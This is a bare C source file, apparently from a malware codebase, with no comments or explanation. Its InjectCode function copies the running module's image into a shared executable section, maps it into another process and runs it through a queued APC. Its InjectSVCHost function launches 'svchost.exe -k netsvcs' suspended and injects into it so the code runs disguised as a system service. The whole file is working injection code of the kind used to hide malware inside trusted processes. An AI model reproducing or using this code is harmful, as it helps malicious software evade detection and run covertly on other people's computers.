#include <windows.h>
#pragma warning(disable:4200)
#include <ntdll.h>
#include <intrin.h>
#include <syslib.h>
#include "defines.h"

bool InjectCode(HANDLE hProcess,HANDLE hThread,LPVOID lpAddr)
{
    bool bRet=false;
    DWORD dwSize=ldr_GetImageSize();
    LPVOID lpBase=ldr_GetImageBase((byte*)_ReturnAddress());
    HANDLE hMap=CreateFileMapping(INVALID_HANDLE_VALUE,NULL,PAGE_EXECUTE_READWRITE,0,dwSize,NULL);
    if (hMap != INVALID_HANDLE_VALUE)
    {
        LPVOID lpMap=MapViewOfFile(hMap,FILE_MAP_WRITE,0,0,0);
        if (lpMap)
        {
            memcpy(lpMap,lpBase,dwSize);
            DWORD dwNewSize=0;
            LPVOID lpNewBase=NULL;
            if (NT_SUCCESS(ZwMapViewOfSection(hMap,hProcess,&lpNewBase,0,dwSize,NULL,&dwNewSize,ViewShare,0,PAGE_EXECUTE_READWRITE)))
            {
                LPVOID lpNewAddr=(LPVOID)((DWORD)lpAddr-(DWORD)lpBase+(DWORD)lpNewBase);
                if (NT_SUCCESS(ZwQueueApcThread(hThread,(PKNORMAL_ROUTINE)lpNewAddr,NULL,NULL,NULL)))
                {
                    ZwResumeThread(hThread,NULL);
                    bRet=true;
                }
                else
                    TerminateThread(hThread,0);
            }
            UnmapViewOfFile(lpMap);
        }
        SysCloseHandle(hMap);
    }
	return bRet;
}

TCHAR szEvent[40];

bool InjectSVCHost(LPVOID lpAddr)
{
    bool bRet=false;
    TCHAR szSvchost[MAX_PATH];
    GetSystemDirectory(szSvchost,MAX_PATH);
    lstrcat(szSvchost,_T("\\svchost.exe -k netsvcs"));

    STARTUPINFO siInfo={0};
    PROCESS_INFORMATION piInfo={0};
    siInfo.cb=sizeof(siInfo);
    if (CreateProcess(NULL,szSvchost,NULL,NULL,false,CREATE_SUSPENDED,NULL,NULL,&siInfo,&piInfo))
    {
        wsprintf(szEvent,_T("%X"),GetTickCount());
        HANDLE hEvent=CreateEvent(NULL,true,false,szEvent);
        bRet=InjectCode(piInfo.hProcess,piInfo.hThread,lpAddr);if (bRet)
        {
            if (WaitForSingleObject(hEvent,10000) == WAIT_TIMEOUT)
                bRet=false;
        }
        SysCloseHandle(hEvent);
        SysCloseHandle(piInfo.hThread);
        SysCloseHandle(piInfo.hProcess);
    }
    return bRet;
}

